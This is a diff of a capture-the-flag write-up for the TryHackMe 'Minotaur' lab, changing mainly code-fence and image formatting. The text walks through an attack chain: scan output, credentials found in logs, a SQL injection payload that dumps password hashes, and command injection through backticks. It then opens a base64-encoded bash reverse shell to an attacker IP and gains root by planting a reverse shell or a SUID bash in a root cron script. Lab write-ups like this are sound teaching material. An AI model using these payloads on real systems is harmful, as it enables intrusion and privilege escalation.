@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="minotaur.png" alt="minotaur" width=200 height=200>
+{{< post-img src="minotaur.png" alt="minotaur" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT     STATE SERVICE  REASON  VERSION
 21/tcp   open  ftp      syn-ack ProFTPD
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -91,12 +89,10 @@ SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
 	SF:rver")%r(WMSRequest,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-8-226-203\.eu-
 	SF:west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20
 	SF:to\x20this\x20MariaDB\x20server");
-
 ```
 
-### ffuf
 
-```
+```bash
 ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://10.10.130.216/FUZZ -fs 3562
 
 .htpasswd               [Status: 403, Size: 1021, Words: 104, Lines: 43]
@@ -119,18 +115,16 @@ fl4g{Hermes_was_not_that_fast}
 The messages say something about a `timer` And an invitation to look around
 
 Don't mind if I do
-
 I tried to fuzz for directories and oh boy it was not simple even with filters
-
 haha jebait.html is a cool page but not useful
 
-```
+```html
 <!-- response - oh would have thouhgt it would be this easy :) -->
 ```
 
 The `logs` dir on other hand got a `post_log` file
 
-```
+```text
 Referer: http://127.0.0.1/minotaur/minotaur-box/login.html
 Accept-Encoding: gzip, deflate
 Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
@@ -141,36 +135,31 @@ email=Daedalus&password=g2e55kh4ck5r
 ```
 
 Alternativel there is a riddle in the source code of login page
-
 you can reconstitute daedalus password solving it, but me I just found them in logs
 
-![labyrinth](login.jpg)
+{{< post-img src="login.jpg" alt="labyrinth" style="width: 400px;" >}}
 
 Now we can login...and there is a search bar...
-
 with the sql database and phpmyadmin installations we found all this now scream SQLI
-
 And the source code says
 
-```
+```html
 <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
 ```
 
 first we try what we know and get
 
-```
+```text
 4 Daedalus b8e4c23686a3a12476ad7779e35f5eb6
 ```
 
 Sql injection is an art that require patience
-
 We try deadalus + common payloads
-
 And this works
 
 `Daedalus' or 1=1#`
 
-```
+```text
 1 Eurycliedes 42354020b68c7ed28dcdeabd5a2baf8e //greeklover
 2 Menekrates 0b3bebe266a81fbfaa79db1604c4e67f //greeksalad
 3 Philostratos b83f966a6f5a9cff9c6e1c52b0aa635b //nickthegreek
@@ -188,22 +177,18 @@ The guy also got a `secret-suff` page with an echo panel
 ugh...regexes `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/`
 
 The panel just echoes whatever goes in...it uses a search argument
-
-Fooling around with it it doesnt echo some charachters: `"` (double quote)
-
+Fooling around with it it doesnt echo some characters: `"` (double quote)
 some are sanitized : `'` (single quote), `#` (hashtag)...and many more
 
-```
+```text
 You really think this is gonna be possible i fixed this @Deadalus -\_- !!!?
 ```
 
 Actually one special char allows us to escape that regex : `` ` `` (that..thing)
-
 Nevermind `|` (pipe vertical bar works too)...
-
 Now I feel like injecting a shell there
 
-```
+```bash
 `id`
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
@@ -214,7 +199,6 @@ kudos!...time to get inside (revshells.com)
 `` `bash -i >& /dev/tcp/10.8.226.203/2311 0>&1` ``
 
 That didnt work...there must be a sort of filter
-
 base64 encoding the payload it is
 
 `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjIyNi4yMDMvMjMxMSAwPiYx`
@@ -225,7 +209,7 @@ we decode it on server side and write it to shell.sh
 
 `` `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjIyNi4yMDMvMjMxMSAwPiYx | base64 -d | tee /tmp/shell.sh` ``
 
-```
+```bash
 bash -i >& /dev/tcp/10.8.226.203/2311 0>&1
 ```
 
@@ -236,7 +220,7 @@ And we are in
 
 `cat dbConnect.php`
 
-```
+```php
 <?php
 
 $servername = "localhost";
@@ -258,7 +242,7 @@ try {
 
 lol no password That might always be good to know
 
-```
+```bash
 daemon@labyrinth:/home/user$ cat flag.txt
 cat flag.txt
 
@@ -270,22 +254,20 @@ fla9{the_minotaur_was_just_a_hipster}
 
 Now privesc?
 
-```
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 bash: /root/.bashrc: Permission denied
 ```
 
 lets explore Minotaur's home folder....nothing useful
-
 where is that timer they were talking about???
 
 `find / -perm u=s 2> /dev/null`
 
 the process hanged....geez (that shell is not very...stable)...anyway not very useful
+Manually exploring then...we start from `/` folder and we see a `"timers"` folder
 
-Manualy exploring then...we start from `/` folder and we see a `"timers"` folder
-
-```
+```bash
 cd timers
 daemon@labyrinth:/timers$ls -al
 ls -al
@@ -297,19 +279,18 @@ drwxr-xr-x 26 root root 4096 nov 9 13:37 ..
 
 we have all permissions on timer.sh
 
-```
+```bash
 cat timer.sh
 #!/bin/bash
 echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
 ```
 
 It appends this to the txt file...probably running as a cron task (it updated in live)
-
 But look at the Owner...ROOT
 
 if we add a shell to it we can catch a connection as root...or more simply make it spawn a shell directly
 
-```
+```bash
 echo '
 #!/bin/bash
 chmod +s /bin/bash
@@ -317,14 +298,13 @@ chmod +s /bin/bash
 ```
 
 Basically we use the root power of this script to make bash a SUID (as we can)
-
 and now we can just...
 
 `/bin/bash -p`
 
 Ok that did not work for me So i decided to just try the shell too
 
-```
+```bash
 echo '
 #!/bin/bash
 bash -i >& /dev/tcp/10.8.226.203/4444 0>&1
@@ -333,7 +313,7 @@ bash -i >& /dev/tcp/10.8.226.203/4444 0>&1
 
 Now we wait...(gotta be patient there)
 
-```
+```bash
 id
 uid=0(root) gid=0(root) groups=0(root)
 root@labyrinth:~#
@@ -343,7 +323,7 @@ root@labyrinth:~# cat da_king_flek.txt
 
 Flag #4
 
-```
+```bash
 cat da_king_flek.txt
 fL4G{escaped_the_labyrinth}
 ```
